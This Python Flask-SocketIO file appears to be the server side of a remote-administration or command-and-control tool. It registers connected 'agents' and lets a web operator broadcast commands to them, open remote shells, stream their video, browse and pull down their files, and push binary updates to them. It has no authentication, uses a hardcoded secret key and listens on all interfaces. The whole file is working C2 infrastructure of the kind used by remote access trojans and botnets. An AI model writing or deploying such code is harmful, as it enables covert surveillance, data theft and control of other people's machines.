from flask import Flask, render_template, request, send_from_directory
from flask_socketio import SocketIO, emit
import os
import datetime

# NEW: colored logging
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    # Mock colorama for environments where it's not installed
    class Fore: pass
    class Style: pass
    Fore.GREEN = Fore.YELLOW = Fore.RED = Fore.CYAN = Fore.MAGENTA = ""
    Style.BRIGHT = Style.RESET_ALL = ""

class Logger:
    @staticmethod
    def _log(level, color, message):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"{Style.BRIGHT}[{color}{level.upper()}{Style.RESET_ALL}] [{timestamp}] {message}")

    @staticmethod
    def info(message):
        Logger._log("info", Fore.GREEN, message)

    @staticmethod
    def warn(message):
        Logger._log("warn", Fore.YELLOW, message)

    @staticmethod
    def error(message):
        Logger._log("error", Fore.RED, message)

    @staticmethod
    def debug(message):
        Logger._log("debug", Fore.CYAN, message)
        
    @staticmethod
    def comms(message):
        Logger._log("comms", Fore.MAGENTA, message)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'a_very_secret_key!'
DOWNLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'downloads')
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)
app.config['DOWNLOAD_FOLDER'] = DOWNLOAD_FOLDER

socketio = SocketIO(app)

# --- State Management ---
connected_agents = {}
file_transfers = {}

# --- Basic HTTP and Socket Routes ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/downloads/<path:filename>')
def download_file(filename):
    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename, as_attachment=True)

@socketio.on('connect')
def handle_connect():
    Logger.info(f"Web client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_agents:
        disconnected_agent_id = connected_agents.pop(request.sid)['id']
        Logger.warn(f"Agent disconnected: {disconnected_agent_id}")
        emit('force_shell_close', {'agent_id': disconnected_agent_id}, broadcast=True)
        emit('update_all_agents', list(connected_agents.values()), broadcast=True)
    else:
        Logger.info(f"Web client disconnected: {request.sid}")

def get_agent_sid(agent_id):
    return next((sid for sid, info in connected_agents.items() if info['id'] == agent_id), None)

# --- Agent Management ---
@socketio.on('register_agent')
def handle_agent_registration(data):
    agent_id = data.get('id')
    if agent_id:
        connected_agents[request.sid] = {'id': agent_id, 'sid': request.sid, 'stats': data.get('stats', {})}
        Logger.info(f"Agent registered: {agent_id} with sid: {request.sid}")
        emit('update_all_agents', list(connected_agents.values()), broadcast=True)

@socketio.on('request_agent_list')
def handle_request_agent_list():
    emit('update_all_agents', list(connected_agents.values()), room=request.sid)

@socketio.on('agent_stats')
def handle_agent_stats(data):
    if request.sid in connected_agents:
        connected_agents[request.sid]['stats'] = data.get('stats', {})
        emit('update_all_agents', list(connected_agents.values()), broadcast=True)

@socketio.on('agent_response')
def handle_agent_response(data):
    emit('update_from_agent', data, broadcast=True)

# --- Generic Command Handling ---
@socketio.on('command_from_web')
def handle_command_from_web(data):
    target_agent_id = data.get('target')
    target_sid = get_agent_sid(target_agent_id)
    if target_agent_id == 'all':
        socketio.emit('command_to_agent', {'command': data.get('command')})
    elif target_sid:
        emit('command_to_agent', {'command': data.get('command')}, room=target_sid)

# --- Video, Shell Handling ---
@socketio.on('video_stream_from_agent')
def handle_video_stream(data):
    emit('video_frame_to_web', data, broadcast=True)

@socketio.on('shell_command_from_web')
def handle_shell_command(data):
    target_sid = get_agent_sid(data.get('target'))
    if target_sid: emit('shell_command_to_agent', {'command': data.get('command')}, room=target_sid)

@socketio.on('shell_output_from_agent')
def handle_shell_output(data):
    emit('shell_output_to_web', data, broadcast=True)

# --- File Browser & Upload/Download ---
@socketio.on('fb_command_from_web')
def handle_fb_command_from_web(data):
    target_sid = get_agent_sid(data.get('target'))
    if target_sid: emit('fb_command_to_agent', data, room=target_sid)

@socketio.on('fb_response_from_agent')
def handle_fb_response(data):
    emit('fb_response_to_web', data, broadcast=True)

@socketio.on('fb_file_chunk_from_agent')
def handle_file_chunk(data):
    transfer_id = data['transfer_id']
    if transfer_id not in file_transfers:
        safe_filename = os.path.basename(data['filename'])
        filepath = os.path.join(app.config['DOWNLOAD_FOLDER'], f"{data['agent_id']}_{safe_filename}")
        file_transfers[transfer_id] = {"path": filepath, "file": open(filepath, 'wb'), "received_chunks": 0}
    
    transfer = file_transfers[transfer_id]
    if data.get('chunk'):
        transfer['file'].write(data['chunk'])
        transfer['received_chunks'] += 1

    if data['final']:
        transfer['file'].close()
        del file_transfers[transfer_id]
        Logger.info(f"File download from {data['agent_id']} complete: {data['filename']}")
        emit('fb_download_ready', {'agent_id': data['agent_id'], 'filename': data['filename'], 'url': f"/downloads/{os.path.basename(transfer['path'])}"}, broadcast=True)

@socketio.on('file_upload_chunk_from_web')
def handle_file_upload_chunk(data):
    target_sid = get_agent_sid(data.get('target'))
    if target_sid:
        Logger.debug(f"Relaying file upload chunk for '{data['filename']}' to {data['target']}")
        emit('file_upload_chunk_to_agent', data, room=target_sid)
    else:
        Logger.error(f"Could not relay upload chunk. Agent '{data.get('target')}' not found.")

# --- System Commands Handling ---
@socketio.on('system_command_from_web')
def handle_system_command_from_web(data):
    target_agent_id = data.get('target')
    command = data.get('command')
    Logger.comms(f"Relaying system command '{command}' to target: {target_agent_id}")

    # The old 'update_script' command is removed as it's now handled by a direct file transfer
    if command == 'update_script':
        Logger.error("'update_script' command is deprecated and has been ignored.")
        return

    if target_agent_id == 'all':
         emit('system_command_to_agent', data, broadcast=True)
    else:
        target_sid = get_agent_sid(target_agent_id)
        if target_sid: emit('system_command_to_agent', data, room=target_sid)

@socketio.on('system_response_from_agent')
def handle_system_response_from_agent(data):
    emit('system_response_to_web', data, broadcast=True)

# --- Agent Binary Update Handling ---
@socketio.on('agent_update_chunk_from_web')
def handle_agent_update_chunk(data):
    target = data.get('target')
    Logger.debug(f"Relaying agent update chunk to {target}")
    if target == 'all':
        emit('update_binary_chunk_to_agent', data, broadcast=True)
    else:
        target_sid = get_agent_sid(target)
        if target_sid:
            emit('update_binary_chunk_to_agent', data, room=target_sid)
        else:
            Logger.error(f"Could not relay update chunk. Agent '{target}' not found.")

if __name__ == '__main__':
    Logger.info(f"Server starting on http://localhost:31717")
    Logger.info(f"Downloads will be saved to: {DOWNLOAD_FOLDER}")
    socketio.run(app, host='0.0.0.0', port=31717, allow_unsafe_werkzeug=True)